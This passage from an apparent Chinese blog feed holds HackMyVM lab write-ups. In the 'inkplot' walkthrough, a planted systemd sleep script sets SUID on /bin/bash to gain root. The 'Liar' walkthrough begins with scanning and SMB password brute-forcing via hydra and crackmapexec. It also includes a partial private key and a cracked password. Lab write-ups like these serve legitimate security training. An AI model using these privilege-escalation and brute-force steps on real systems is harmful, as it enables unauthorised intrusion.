<span class="token assign-left variable">aDfAD8yhiUmbUzAAAADnBhdWxpbmVAZGViaWFuAQIDBA</span><span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<p>然后用私钥连接ssh，记得600权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># vim 123.txt</span>
                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh pauline@192.168.56.155 -i 123.txt </span>
Auto-standby now activated after <span class="token number">2</span> min of inactivity
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE<span class="token operator">!</span>          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 <span class="token keyword">for</span> <span class="token string">'123.txt'</span> are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key <span class="token string">"123.txt"</span><span class="token builtin class-name">:</span> bad permissions
pauline@192.168.56.155's password: 
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># chmod 600 123.txt                                    </span>
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh pauline@192.168.56.155 -i 123.txt</span>
Auto-standby now activated after <span class="token number">2</span> min of inactivity
Linux inkplot <span class="token number">6.1</span>.0-10-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64</span>
The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
╭─pauline@inkplot ~ 
╰─$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pauline<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pauline<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pauline<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>admin<span class="token punctuation">)</span></code></pre>
<p>拿到user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─pauline@inkplot ~ 
╰─$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> 
total <span class="token number">72</span>
drwx---r-x  <span class="token number">5</span> pauline pauline <span class="token number">4096</span> Apr <span class="token number">18</span> <span class="token number">15</span>:10 <span class="token builtin class-name">.</span>
drwxr-xr-x  <span class="token number">4</span> root    root    <span class="token number">4096</span> Jul <span class="token number">28</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">3472</span> Apr <span class="token number">18</span> <span class="token number">15</span>:06 abc.enc.enc
-rw-r--r--  <span class="token number">1</span> pauline pauline  <span class="token number">220</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">3526</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .bashrc
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">1738</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> cipher.py
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">3472</span> Apr <span class="token number">18</span> <span class="token number">15</span>:05 id_rsa.enc
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">4632</span> Apr <span class="token number">18</span> <span class="token number">15</span>:03 id_rsa.enc.enc
-rw-r-----  <span class="token number">1</span> pauline pauline   <span class="token number">44</span> Jul <span class="token number">25</span>  <span class="token number">2023</span> keys.json
-rw-------  <span class="token number">1</span> pauline pauline   <span class="token number">20</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> .lesshst
drwxr-xr-x  <span class="token number">3</span> pauline pauline <span class="token number">4096</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .local
drwxr-xr-x <span class="token number">12</span> pauline pauline <span class="token number">4096</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .oh-my-zsh
-rw-r--r--  <span class="token number">1</span> pauline pauline  <span class="token number">807</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .profile
drwx------  <span class="token number">2</span> pauline pauline <span class="token number">4096</span> Jul <span class="token number">28</span>  <span class="token number">2023</span> .ssh
-rw-r--r--  <span class="token number">1</span> pauline pauline    <span class="token number">0</span> Jul <span class="token number">25</span>  <span class="token number">2023</span> .sudo_as_admin_successful
-rwx------  <span class="token number">1</span> pauline pauline   <span class="token number">33</span> Jul <span class="token number">24</span>  <span class="token number">2023</span> user.txt
-rw-------  <span class="token number">1</span> pauline pauline  <span class="token number">203</span> Apr <span class="token number">18</span> <span class="token number">15</span>:10 .zsh_history
-rw-r--r--  <span class="token number">1</span> pauline pauline <span class="token number">3890</span> Jul <span class="token number">22</span>  <span class="token number">2023</span> .zshrc
╭─pauline@inkplot ~ 
╰─$ <span class="token function">cat</span> user.txt<span class="token operator">|</span> md5sum
85695f22e85b28811add8645febdf8e4  -</code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>id可以看到pauline所属组为admin <code>1002(admin)</code><br>寻找相关权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─pauline@inkplot ~ 
╰─$ <span class="token function">find</span> / <span class="token parameter variable">-group</span> admin <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/lib/systemd/system-sleep</code></pre>
<p>当打开shell的时候都会执行&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system-sleep目录下的脚本<br>写个脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">20</span>
drwxrwx---  <span class="token number">2</span> root    admin    <span class="token number">4096</span> Apr <span class="token number">18</span> <span class="token number">15</span>:17 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root    root    <span class="token number">12288</span> Jul <span class="token number">28</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwxr-xr-x  <span class="token number">1</span> pauline pauline    <span class="token number">52</span> Apr <span class="token number">18</span> <span class="token number">15</span>:17 script
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ <span class="token function">cat</span> script 
<span class="token comment">#!/bin/bash</span>
<span class="token function">chmod</span> +s /bin/bash

<span class="token function">chmod</span> +s /bin/find
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ <span class="token function">chmod</span> +x script</code></pre>

<p>然后等，等到提示system被暂停的时候我们可以重启shell然后拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pauline@inkplot:~$ 
Broadcast message from root@inkplot <span class="token punctuation">(</span>Thu <span class="token number">2024</span>-04-18 <span class="token number">15</span>:30:48 CEST<span class="token punctuation">)</span>:

The system will <span class="token function">suspend</span> now<span class="token operator">!</span>

client_loop: send disconnect: Broken pipe
                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh pauline@192.168.56.155 -i 123.txt</span>
Auto-standby now activated after <span class="token number">2</span> min of inactivity
Linux inkplot <span class="token number">6.1</span>.0-10-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr <span class="token number">18</span> <span class="token number">15</span>:26:44 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
╭─pauline@inkplot ~ 
╰─$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
bash-5.2<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pauline<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pauline<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>pauline<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>admin<span class="token punctuation">)</span>
bash-5.2<span class="token comment"># cat /root/* | md5sum</span>
d02568a00695b655bbeb56bf6f44dd45  -</code></pre>
<p>最后这块没怎么搞懂，跟着wp复现的。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>websocket</tag>
        <tag>systemd</tag>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Liar</title>
    <url>/posts/b9453620/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.196</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:b4:46:04       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.196  08:00:27:23:b8:a2       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.957</span> seconds <span class="token punctuation">(</span><span class="token number">130.81</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.56.196 -p-
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-14 <span class="token number">21</span>:27 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.196
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65523</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:23:B8:A2 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Microsoft Windows <span class="token number">2019</span>
OS details: Microsoft Windows Server <span class="token number">2019</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-14T19:39:38
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:23:b8:a2 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span>_clock-skew: 5h59m55s

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.36</span> ms <span class="token number">192.168</span>.56.196

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">747.61</span> seconds</code></pre>

<p>开启了smb服务，msrpc服务，先去看下80端口的http服务<br><img src="https://ooo.0x0.ooo/2024/07/14/ORqPgK.png" alt="ORqPgK.png" loading="lazy"></p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.196/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.196/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Progress: <span class="token number">345413</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">26.10</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">347732</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">26.28</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>web服务大概没什么东西，不过给了一个用户名<code>nica</code></p>
<h2 id="smb探测"><a href="#smb探测" class="headerlink" title="smb探测"></a>smb探测</h2><p>先看一下有没有共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token parameter variable">-L</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.196      
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>root<span class="token punctuation">]</span>:
session setup failed: NT_STATUS_ACCESS_DENIED</code></pre>
<p>尝试一下无密码登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token parameter variable">-L</span> <span class="token number">192.168</span>.56.196 <span class="token parameter variable">-U</span> nica
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>nica<span class="token punctuation">]</span>:
session setup failed: NT_STATUS_LOGON_FAILURE</code></pre>
<p>尝试爆破,用用户名为<code>nica</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> hydra <span class="token parameter variable">-l</span> nica <span class="token parameter variable">-P</span> /usr/share/wordlists/rockyou.txt <span class="token number">192.168</span>.56.196 smb <span class="token parameter variable">-t</span> <span class="token number">1</span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2024</span>-07-14 <span class="token number">21</span>:45:27
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">1</span> task per <span class="token number">1</span> server, overall <span class="token number">1</span> task, <span class="token number">14344400</span> login tries <span class="token punctuation">(</span>l:1/p:14344400<span class="token punctuation">)</span>, ~14344400 tries per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking smb://192.168.56.196:445/
<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> invalid reply from target smb://192.168.56.196:445/</code></pre>
<p>换一个工具<code>crackmapexec</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.196 <span class="token parameter variable">-u</span> nica <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10.0</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:WIN-IURF14RBVGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:WIN-IURF14RBVGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:123456 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:12345 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:123456789 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:password STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:iloveyou STATUS_LOGON_FAILURE 
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>nica:hardcore </code></pre>
<p>拿到密码 <code>hardcore</code></p>
<p>看一下共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient <span class="token parameter variable">-L</span> //192.168.56.196 <span class="token parameter variable">-U</span> nica <span class="token parameter variable">--option</span><span class="token operator">=</span><span class="token string">'client min protocol=SMB2'</span>

Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>nica<span class="token punctuation">]</span>:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
SMB1 disabled -- no workgroup available</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient.py nica:hardcore@192.168.56.196
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Type <span class="token builtin class-name">help</span> <span class="token keyword">for</span> list of commands
<span class="token comment"># shares</span>
ADMIN$
C$
IPC$
<span class="token comment"># use ADMIN$</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> SMB SessionError: STATUS_ACCESS_DENIED<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>Access Denied<span class="token punctuation">&#125;</span> A process has requested access to an object but has not been granted those access rights.<span class="token punctuation">)</span>
<span class="token comment"># use C$</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> SMB SessionError: STATUS_ACCESS_DENIED<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>Access Denied<span class="token punctuation">&#125;</span> A process has requested access to an object but has not been granted those access rights.<span class="token punctuation">)</span>
<span class="token comment"># use IPC$</span>
<span class="token comment"># ls </span>
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> InitShutdown
-rw-rw-rw-          <span class="token number">4</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> lsass
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> ntsvcs
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> scerpc
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-2ec-0
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> epmapper
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-1ac-0
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> LSM_API_service
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> eventlog
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-36c-0
